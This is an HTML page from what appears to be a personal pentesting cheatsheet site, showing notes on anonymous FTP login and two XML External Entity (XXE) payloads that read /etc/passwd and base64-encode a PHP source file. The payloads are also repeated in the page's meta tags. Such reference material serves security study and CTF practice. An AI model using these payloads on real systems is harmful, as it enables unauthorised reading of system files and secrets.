@@ -1,0 +1,773 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content=" ftp # login via ftp
+ftp target-ip anonymous login
+username: anonymous password: anonymous XML External Entity (XXE) # Read local files
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt; &lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt; &lt;foo&gt; &lt;something&gt;&amp;xxe;&lt;/something&gt; &lt;/foo&gt; Read binary or files that otherwise can&rsquo;t be display (.php)
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt; &lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=db.php&#34;&gt;]&gt; &lt;foo&gt; &lt;something&gt;&amp;xxe;&lt;/something&gt; &lt;/foo&gt; ">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://www.tagnull.de/docs/Cheatsheet/initial-access/network/">
+  <meta property="og:site_name" content="www.tagnull.de">
+  <meta property="og:title" content="network">
+  <meta property="og:description" content=" ftp # login via ftp
+ftp target-ip anonymous login
+username: anonymous password: anonymous XML External Entity (XXE) # Read local files
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt; &lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt; &lt;foo&gt; &lt;something&gt;&amp;xxe;&lt;/something&gt; &lt;/foo&gt; Read binary or files that otherwise can’t be display (.php)
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt; &lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=db.php&#34;&gt;]&gt; &lt;foo&gt; &lt;something&gt;&amp;xxe;&lt;/something&gt; &lt;/foo&gt; ">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+<title>network | www.tagnull.de</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/logo.png" >
+<link rel="canonical" href="https://www.tagnull.de/docs/Cheatsheet/initial-access/network/">
+<link rel="stylesheet" href="/book.min.aaab74181c6b1b4045b90f1cce4aaa1631e06c4b04ec2890a00c5723953b070a.css" integrity="sha256-qqt0GBxrG0BFuQ8czkqqFjHgbEsE7CiQoAxXI5U7Bwo=" crossorigin="anonymous">
+  <script defer src="/fuse.min.js"></script>
+  <script defer src="/en.search.min.2323b3bb3c0c7c6758b4a4ad8d0d6d2f21440a0a4886e59ff5fe292f37603e23.js" integrity="sha256-IyOzuzwMfGdYtKStjQ1tLyFECgpIhuWf9f4pLzdgPiM=" crossorigin="anonymous"></script>
+
+  
+
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>www.tagnull.de</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Cheatsheet</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d7b6e2b3b2bd9f24f70a74fad4ae1939" class="toggle"  />
+    <label for="section-d7b6e2b3b2bd9f24f70a74fad4ae1939" class="flex justify-between">
+      <a role="button" class="">Collection</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/Cheatsheet/collection/mail/" class="">mail</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2860456b7de11418b89bc572c43149f3" class="toggle"  />
+    <label for="section-2860456b7de11418b89bc572c43149f3" class="flex justify-between">
+      <a role="button" class="">Enumeration</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/Cheatsheet/enumeration/mail/" class="">mail</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/Cheatsheet/enumeration/network/" class="">network</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/Cheatsheet/enumeration/web/" class="">web</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/Cheatsheet/enumeration/operating-system/" class="">operating system</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/Cheatsheet/enumeration/privilege-escalation/" class="">privilege escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/Cheatsheet/enumeration/smb/" class="">smb</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/Cheatsheet/enumeration/vulnerabilities/" class="">vulnerabilities</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-452375808cf41fa213a2bdcb15a5fe7c" class="toggle" checked />
+    <label for="section-452375808cf41fa213a2bdcb15a5fe7c" class="flex justify-between">
+      <a role="button" class="">Initial Access</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/Cheatsheet/initial-access/network/" class="active">network</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/Cheatsheet/initial-access/sql/" class="">sql</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/Cheatsheet/initial-access/web/" class="">web</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-73088f9e1c7f62d1ff61f2cb6b3a8135" class="toggle"  />
+    <label for="section-73088f9e1c7f62d1ff61f2cb6b3a8135" class="flex justify-between">
+      <a role="button" class="">Lateral Movement</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/Cheatsheet/lateral-movement/network/" class="">network</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-300439dc6c81e7f8106c3eab98675b63" class="toggle"  />
+    <label for="section-300439dc6c81e7f8106c3eab98675b63" class="flex justify-between">
+      <a role="button" class="">Active Directory</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/Cheatsheet/active-directory/discovery/" class="">discovery</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-f1c85964cb4e1e3e13dfaf4558a33249" class="toggle"  />
+    <label for="section-f1c85964cb4e1e3e13dfaf4558a33249" class="flex justify-between">
+      <a role="button" class="">HTB Writeups</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/bountyhunter/" class="">BountyHunter</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/cap/" class="">Cap</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/the-notebook/" class="">The Notebook</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/traceback/" class="">Traceback</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/ret2plt-exploit/" class="">Exploit-Development - ret2plt</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/safe/" class="">Safe</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/fortune/" class="">Fortune</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/onetwoseven/" class="">OneTwoSeven</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/querier/" class="">Querier</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/irked/" class="">Irked</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/gettinghashes/" class="">NTLM Hashes via GPO redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/stratosphere/" class="">Stratosphere</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/access/" class="">Access</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/ypuffy/" class="">Ypuffy</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/secnotes/" class="">SecNotes - WriteUp</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-eba9495c08f1740750b4c94d7ec66515" class="toggle"  />
+    <label for="section-eba9495c08f1740750b4c94d7ec66515" class="flex justify-between">
+      <a role="button" class="">OSCP</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/OSCP/oscp-reporting/" class="">Path to OSCP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/OSCP/oscp-exploitdev/" class="">Path to OSCP - Exploit Development</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/OSCP/oscp-review/" class="">Path to OSCP - Review</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>network</strong>
+
+  <label for="toc-control">
+    
+  </label>
+</div>
+
+
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><h1 id="ftp">
+  ftp
+  <a class="anchor" href="#ftp">#</a>
+</h1>
+<hr>
+<p>login via ftp</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ftp target-ip
+</span></span></code></pre></div><p>anonymous login</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>username: anonymous
+</span></span><span style="display:flex;"><span>password: anonymous
+</span></span></code></pre></div><hr>
+<h1 id="xml-external-entity-xxe">
+  XML External Entity (XXE)
+  <a class="anchor" href="#xml-external-entity-xxe">#</a>
+</h1>
+<hr>
+<p>Read local files</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>]&gt;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;foo&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;something&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/something&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;/foo&gt;</span>
+</span></span></code></pre></div><p>Read binary or files that otherwise can&rsquo;t be display (.php)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=db.php&#34;&gt;</span>]&gt;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;foo&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;something&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/something&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;/foo&gt;</span>
+</span></span></code></pre></div><hr>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
